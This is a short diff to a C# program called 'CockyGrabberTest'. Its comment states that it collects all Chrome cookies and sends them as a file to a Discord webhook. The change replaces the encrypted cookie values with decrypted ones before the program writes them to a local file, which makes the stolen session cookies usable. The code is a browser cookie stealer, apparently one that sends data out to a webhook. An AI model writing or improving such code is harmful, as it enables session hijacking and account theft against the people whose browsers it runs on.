@@ -7,7 +7,7 @@ using Discord.Webhook;
 
 namespace CockyGrabberTest
 {
-    // This Program collects all Chrome Cookies and sends them as a file to a discord webhook
+    // This Program collects all Chrome cookies and sends them as a file to a discord webhook
     // (This Example uses the Discord.Net library)
     class Program
     {
@@ -19,7 +19,7 @@ namespace CockyGrabberTest
 
             g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
             {
-                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
+                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}"); // Add the cookie hostname, name, and value to the 'cookies' list
             });
 
             File.WriteAllLines("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
